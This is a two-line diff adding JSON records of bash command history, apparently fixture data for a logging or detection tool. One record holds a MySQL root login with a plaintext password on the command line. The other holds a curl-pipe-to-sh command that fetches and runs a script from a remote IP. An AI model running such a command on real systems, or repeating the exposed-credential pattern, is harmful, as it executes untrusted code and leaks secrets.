@@ -1,0 +1,2 @@
+{"PID": 1030, "Process": "bash", "CommandTime": "2026-11-01T08:06:00+00:00", "Command": "mysql -u root -pHunter2pass appdb"}
+{"PID": 1030, "Process": "bash", "CommandTime": "2026-11-01T08:07:00+00:00", "Command": "curl -s http://198.51.100.7/x.sh | sh"}
